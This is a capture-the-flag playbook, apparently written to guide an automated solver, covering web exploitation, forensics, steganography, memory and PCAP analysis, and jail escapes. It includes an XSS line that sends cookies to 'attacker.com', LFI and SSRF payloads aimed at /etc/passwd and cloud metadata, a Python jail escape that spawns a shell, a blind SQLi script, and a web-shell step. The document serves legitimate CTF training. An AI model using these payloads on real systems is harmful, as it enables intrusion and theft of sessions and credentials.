# Default / Forensics / Web / Misc Playbook

---

## Table of Contents

1. Scope and Goal Model
2. Required Background Knowledge
3. Master Workflow (Web)
4. Master Workflow (Forensics & Misc)
5. Web: Reconnaissance and Discovery
6. Web: Client-Side Vulnerabilities (XSS, CSRF, CORS)
7. Web: Server-Side Vulnerabilities (SQLi, LFI/RFI, SSRF, Command Injection)
8. Web: Authentication and Session Management
9. Forensics: File Analysis and Carving
10. Forensics: Steganography
11. Forensics: Memory Analysis (Volatility)
12. Forensics: Network Traffic Analysis (PCAP)
13. Misc: Jail Escapes and Sandboxes
14. Exploit Engineering Practices
15. Toolchain Reference
16. Python / Bash Snippet Reference
17. Decision Tree
18. Failure Mode Diagnostics
19. Exploit Skeleton
20. Worked Methodology Example
21. Glossary
22. Forbidden Anti-Patterns

---

## 1. Scope and Goal Model

This playbook applies when a challenge does not fit strictly into Binary Exploitation (Pwn), Reverse Engineering, or Cryptography. It covers Web exploitation, Digital Forensics, OSINT, and Miscellaneous (Misc) challenges.

Terminal objectives typically involve:
- **Web:** Gaining Initial Access (RCE), extracting data from a database, bypassing authentication, or exploiting a headless browser via XSS to steal cookies.
- **Forensics:** Extracting hidden data from an image, audio file, memory dump, or packet capture.
- **Misc:** Escaping a Python/Bash jail, solving programming puzzles, or interacting with a bizarre service.

---

## 2. Required Background Knowledge

- **Web Protocols:** HTTP/HTTPS methods, headers (Cookie, Authorization, CORS headers), status codes, REST APIs, GraphQL.
- **Web Languages:** PHP, Node.js (JavaScript), Python (Flask/Django), SQL variants (MySQL, PostgreSQL, SQLite).
- **Forensics Fundamentals:** File signatures (magic bytes), metadata structures (EXIF), file carving concepts.
- **Network Fundamentals:** TCP/IP stack, DNS, HTTP, FTP, SMB, Wireshark filtering.
- **OS Internals:** Linux file hierarchy, common configuration files (`/etc/passwd`, `/etc/shadow`), basic memory structures.

---

## 3. Master Workflow (Web)

```text
Reconnaissance (Dirbusting, Port Scanning, Source Code Review)
        |
Input Mapping (Identify all GET/POST parameters, headers, cookies)
        |
Vulnerability Scanning (Fuzzing parameters for SQLi, XSS, LFI)
        |
Vulnerability Identification
        |
Exploit Crafting (Local testing of payloads, bypassing WAFs/filters)
        |
Exploit Execution
        |
Post-Exploitation (Privilege escalation, reading files, lateral movement)
        |
Flag Collection
```

---

## 4. Master Workflow (Forensics & Misc)

```text
Initial Inspection (file, strings, exiftool, binwalk)
        |
Type Identification (Image, Audio, PCAP, Memory Dump, Archive)
        |
Data Extraction (Carving hidden files, extracting metadata)
        |
Deep Analysis (Steganography tools, Volatility plugins, Wireshark streams)
        |
Data Transformation (Decoding Base64/Hex, decrypting payloads)
        |
Flag Recovery
```

---

## 5. Web: Reconnaissance and Discovery

- **Source Code Review:** Always check HTML source, JavaScript files, and comments for hidden endpoints, API keys, or logic flaws.
- **Directory Brute-forcing:** Use `ffuf`, `dirsearch`, or `gobuster` to find hidden directories, `.git` folders, backup files (`.bak`, `.old`), and administrative panels.
- **Parameter Discovery:** Use `arjun` to find hidden GET/POST parameters.
- **Tech Stack Identification:** Use `wappalyzer` or HTTP response headers (e.g., `X-Powered-By`) to identify the backend framework. This dictates the specific payloads (e.g., SSTI payloads differ for Jinja2 vs. Twig).

---

## 6. Web: Client-Side Vulnerabilities (XSS, CSRF, CORS)

- **Cross-Site Scripting (XSS):**
  - *Reflected:* Payload in URL is reflected directly.
  - *Stored:* Payload is saved to database and viewed by an admin (headless browser bot).
  - *DOM-based:* Payload executes purely in the browser via JavaScript sinks (e.g., `innerHTML`, `eval`).
  - *Goal:* Typically to steal the admin's cookie via `document.cookie`, exfiltrate via `fetch('http://attacker.com/?c=' + btoa(document.cookie))`, or force the admin to perform an action.
- **Cross-Site Request Forgery (CSRF):** Forcing an authenticated user to execute an unwanted action. Usually requires crafting an HTML form on an attacker-controlled site that auto-submits.
- **CORS Misconfigurations:** If `Access-Control-Allow-Origin` dynamically reflects the Origin header, and `Access-Control-Allow-Credentials` is true, an attacker can read sensitive data on behalf of the victim via XHR.

---

## 7. Web: Server-Side Vulnerabilities (SQLi, LFI/RFI, SSRF, Command Injection)

- **SQL Injection (SQLi):**
  - *In-band (Union):* Retrieve data directly in the response using `UNION SELECT`.
  - *Error-based:* Force the database to throw an error containing the flag.
  - *Blind (Boolean/Time-based):* Extract data bit-by-bit by asking True/False questions (e.g., `IF(SUBSTRING(flag,1,1)='A', SLEEP(5), 0)`).
- **Local File Inclusion (LFI):**
  - Reading files via `?page=../../../../etc/passwd`.
  - *Bypasses:* Null byte `%00` (older PHP), double URL encoding, wrappers like `php://filter/convert.base64-encode/resource=index.php`.
  - *RCE Escalation:* Log poisoning, `/proc/self/environ`, PHP session files.
- **Server-Side Request Forgery (SSRF):**
  - Forcing the server to make HTTP requests to internal resources (e.g., `http://127.0.0.1/admin` or AWS metadata `http://169.254.169.254/latest/meta-data/`).
- **Command Injection:**
  - Concatenating shell commands via `;`, `|`, `&&`, or `$()`.
  - *Bypasses:* `${IFS}` for spaces, base64 encoding payloads, wildcards.
- **Server-Side Template Injection (SSTI):**
  - Injecting template syntax (e.g., `{{ 7*7 }}`) to execute code. Payloads are specific to the engine (Jinja2, Twig, Smarty).

---

## 8. Web: Authentication and Session Management

- **JWT (JSON Web Tokens):** Check for algorithm confusion (RS256 to HS256), `none` algorithm, or crack weak secrets. (See Crypto Playbook).
- **Insecure Direct Object Reference (IDOR):** Changing a parameter like `user_id=1` to `user_id=2` to access another user's data.
- **Session Fixation / Prediction:** Weakly generated session IDs or forcing a user to use a known session ID.
- **Mass Assignment:** Passing extra parameters (e.g., `is_admin=true`) in JSON/POST requests that the backend blindly binds to the user model.

---

## 9. Forensics: File Analysis and Carving

- **Magic Bytes:** Files are identified by their headers (e.g., `FF D8 FF E0` for JPEG, `89 50 4E 47` for PNG). Use `file` and `xxd`.
- **Strings Analysis:** `strings -n 6 file | grep -i flag` is mandatory for every binary file.
- **Metadata:** Use `exiftool` on images/documents to find hidden comments, authors, or GPS coordinates.
- **File Carving:** Use `binwalk -e` to extract embedded files (e.g., a ZIP inside an image). If `binwalk` fails, use `foremost` or `dd` manually.

---

## 10. Forensics: Steganography

Hiding data inside other files (usually images or audio).

- **Images:**
  - LSB (Least Significant Bit): Data hidden in the lowest bits of pixels. Use `zsteg` (for PNG/BMP) or `stegsolve.jar`.
  - Steghide: Password-protected steganography for JPEG/WAV. Brute-force with `stegcracker`.
  - Outguess / JPHide: Other common stego tools.
- **Audio:**
  - Spectrograms: Hidden visual messages. Open in Audacity or Sonic Visualiser and view the Spectrogram.
  - LSB / Phase Coding in WAV files.

---

## 11. Forensics: Memory Analysis (Volatility)

Analyzing RAM dumps (`.vmem`, `.raw`).

- **Identify Profile:** `volatility -f dump.raw imageinfo`
- **List Processes:** `volatility -f dump.raw --profile=X pslist` or `psscan`.
- **Network Connections:** `volatility -f dump.raw --profile=X netscan`.
- **Command Line History:** `volatility -f dump.raw --profile=X cmdline` or `consoles`.
- **Extract Files:** Find file offset via `filescan`, then extract with `dumpfiles -Q <offset>`.
- **Extract Process Memory:** `memdump -p <PID>`.

---

## 12. Forensics: Network Traffic Analysis (PCAP)

- **Wireshark Basics:** Filter by protocol (`http`, `dns`, `ftp`). Follow TCP/UDP streams to see raw conversations.
- **File Extraction:** File -> Export Objects -> HTTP / FTP / SMB.
- **Encrypted Traffic:** If TLS/SSL is used, look for a `SSLKEYLOGFILE` in the challenge files to decrypt the traffic via Edit -> Preferences -> Protocols -> TLS.
- **USB Traffic:** Use `tshark` or Wireshark to extract USB Leftover Capture Data (e.g., Keystrokes or Mouse movements) and script the translation to ASCII.

---

## 13. Misc: Jail Escapes and Sandboxes

- **Python Jails:** Escaping restricted `eval()` or `exec()` environments.
  - Traverse the MRO (Method Resolution Order) to find `os`: `().__class__.__bases__[0].__subclasses__()`.
  - Find builtins: `[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')`.
- **Bash Jails:** Bypassing restricted shells (`rbash`).
  - Check allowed commands. Use `vi`, `awk`, `find`, `more`, or `tar` to spawn a shell (GTFOBins).
  - Use wildcard expansion (`/*/*/*/sh`) or command substitution.

---

## 14. Exploit Engineering Practices

- **Automate Interactions:** Use `requests` for Web, `pwntools` for Misc TCP services. Do not do repetitive tasks manually.
- **Rate Limiting:** Be aware of server rate limits. Use delays in scripts if necessary.
- **Blind Exploitation:** Write robust scripts for Blind SQLi or Timing attacks. Handle timeouts and retries gracefully.
- **Local Replication:** If given source code (e.g., Dockerfile), build it locally and test your exploit against your local container before hitting remote.

---

## 15. Toolchain Reference

| Tool | Purpose |
|---|---|
| **ffuf / dirsearch** | Web directory and file brute-forcing. |
| **Burp Suite** | Intercepting proxy, modifying requests, Repeater/Intruder. |
| **sqlmap** | Automated SQL injection detection and exploitation. |
| **binwalk** | File carving and signature analysis. |
| **exiftool** | Metadata extraction. |
| **zsteg / steghide** | Image steganography. |
| **Volatility 2/3** | Memory forensics. |
| **Wireshark / tshark** | Network traffic analysis. |
| **CyberChef** | Data decoding, formatting, and quick analysis. |

---

## 16. Python / Bash Snippet Reference

**Python - Blind SQLi Skeleton:**
```python
import requests
import string

url = "http://target.com/api"
flag = ""
charset = string.ascii_letters + string.digits + "{}_"

for i in range(1, 50):
    for c in charset:
        payload = f"' OR (SELECT SUBSTRING(flag,{i},1) FROM flags)='{c}' -- "
        res = requests.post(url, data={'username': payload})
        if "Success" in res.text:
            flag += c
            print(f"Flag so far: {flag}")
            break
```

**Bash - Basic Forensics Extraction:**
```bash
file target.bin
strings -n 8 target.bin | grep -i flag
binwalk -e target.bin
exiftool target.bin
```

---

## 17. Decision Tree

```text
What is the challenge type?
  Web -> Is source code provided?
    Yes -> Source code audit. Look for specific sink (SQL query, exec, eval).
    No -> Black-box recon. Fuzz directories, parameters, and inputs.
  Forensics -> What is the file type?
    Image -> EXIF, strings, binwalk, zsteg, steghide.
    PCAP -> Wireshark, Export Objects, Follow Streams.
    Memory Dump -> Volatility (imageinfo, pslist, cmdline, filescan).
  Misc -> What is the interface?
    Netcat/TCP -> Python/Bash Jail? Write bypass payload.
```

---

## 18. Failure Mode Diagnostics

| Symptom | Likely cause | Resolution |
|---|---|---|
| SQLmap fails to find injection | WAF / Custom filtering | Write a custom Python script or tamper script for sqlmap. |
| Binwalk extracts nothing | File is encrypted or uses custom format | Use `hexeditor` to look for custom magic bytes or XOR obfuscation. |
| Volatility profile fails | Wrong OS/Service Pack | Use `imageinfo` or `kdbgscan` to identify the exact profile. |
| Web payload works in Burp but not browser | URL Encoding / CORS | Ensure payload is properly URL encoded when sent via browser. |

---

## 19. Exploit Skeleton

**Web Requests Skeleton:**
```python
import requests

url = "http://target.com/vulnerable"
headers = {"User-Agent": "Mozilla/5.0"}
cookies = {"session": "your_cookie_here"}

def exploit():
    # Example POST request
    data = {"param": "payload"}
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    
    if "flag{" in response.text:
        print("[+] Flag found!")
        print(response.text)
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    exploit()
```

---

## 20. Worked Methodology Example

1. **Reconnaissance:** Provided a web URL. Run `dirsearch`, find `/admin` and `/?page=index`.
2. **Vulnerability Scanning:** Test `?page=../../../../etc/passwd`. It works (LFI).
3. **Exploit Crafting:** Use PHP filter wrapper `php://filter/convert.base64-encode/resource=admin.php` to read the source code of `/admin`.
4. **Analysis:** Decode base64. The source code reveals a hardcoded admin password.
5. **Execution:** Log in to `/admin` with the password.
6. **Post-Exploitation:** The admin panel has a file upload feature. Upload a PHP web shell.
7. **Flag Recovery:** Run `cat /flag.txt` via the web shell.

---

## 21. Glossary

| Term | Definition |
|---|---|
| **LFI / RFI** | Local/Remote File Inclusion. |
| **XSS** | Cross-Site Scripting. |
| **SSRF** | Server-Side Request Forgery. |
| **SSTI** | Server-Side Template Injection. |
| **Magic Bytes** | The first few bytes of a file that identify its format. |
| **Carving** | Extracting data embedded within another file. |

---

## 22. Forbidden Anti-Patterns

- **Do NOT blindly run heavy automated scanners (like Nikto or fully automated sqlmap)** without understanding the application first. They create noise and often miss complex logical flaws.
- **Do NOT assume a file is what its extension claims.** Always use `file` and `hexeditor` to verify magic bytes.
- **Do NOT forget to URL encode payloads** when testing web vulnerabilities manually.
- **Do NOT attempt to guess complex passwords** without a valid reason or a highly targeted wordlist.
- **Do NOT skip source code review.** If source is provided, 99% of the time the vulnerability requires understanding a specific logic flaw that black-box testing will miss.
- **Do NOT test blind SQLi without managing connection timeouts.** Your script must handle network latency.
